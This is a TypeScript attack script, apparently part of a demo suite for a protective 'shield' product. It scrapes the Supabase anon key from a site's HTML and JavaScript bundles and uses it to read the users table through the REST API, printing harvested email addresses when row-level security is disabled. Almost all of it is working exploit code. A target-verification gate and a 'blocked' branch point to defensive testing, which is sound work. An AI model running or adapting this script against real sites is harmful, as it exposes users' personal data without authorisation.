// Supabase RLS disabled: use the anon key that ships in the browser bundle to read whole tables.
import { banner, requireVerifiedTarget } from "./_lib.ts";

const origin = requireVerifiedTarget();
banner("leak-supabase", origin);

// Step 1: recover the anon key the way an attacker would — grep it out of the shipped JS bundle.
async function anonKeyFromBundle(): Promise<string | null> {
  const html = await fetch(`${origin}/`).then((r) => r.text());
  const scripts = [...html.matchAll(/src="([^"]+\.js)"/g)].map((m) => m[1]);
  // The homepage HTML itself may also inline the key; check it plus each script chunk.
  const sources = [html];
  for (const s of scripts.slice(0, 40)) {
    const url = s.startsWith("http") ? s : `${origin}${s}`;
    try {
      sources.push(await fetch(url).then((r) => r.text()));
    } catch {
      /* ignore */
    }
  }
  for (const src of sources) {
    const m = src.match(/eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/);
    if (m) return m[0];
  }
  return null;
}

let key = await anonKeyFromBundle();
if (!key) {
  // Fallback: the known demo anon key (still only ever sent to a verified host).
  key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYW5vbiIsImlzcyI6InN1cGFiYXNlIiwiaWF0IjoxNzAwMDAwMDAwfQ.DEMO_FAKE_ANON_SIGNATURE_do_not_use";
  console.log("(anon key not found in bundle; using the known demo key)");
} else {
  console.log(`Recovered anon key from the JS bundle: ${key.slice(0, 4)}…`);
}

const res = await fetch(`${origin}/supabase/rest/v1/users`, {
  headers: { apikey: key, Authorization: `Bearer ${key}` },
});

if (res.status === 403 || res.status === 429) {
  console.log(`Blocked (shield) with ${res.status} — Supabase read refused.`);
} else if (res.ok) {
  const rows = await res.json();
  const emails = Array.isArray(rows) ? rows.map((r: { email?: string }) => r.email).filter(Boolean) : [];
  console.log(`RLS disabled: pulled ${emails.length} user emails with the anon key. e.g. ${emails.slice(0, 3).join(", ")}`);
} else {
  console.log(`Unexpected response ${res.status}.`);
}
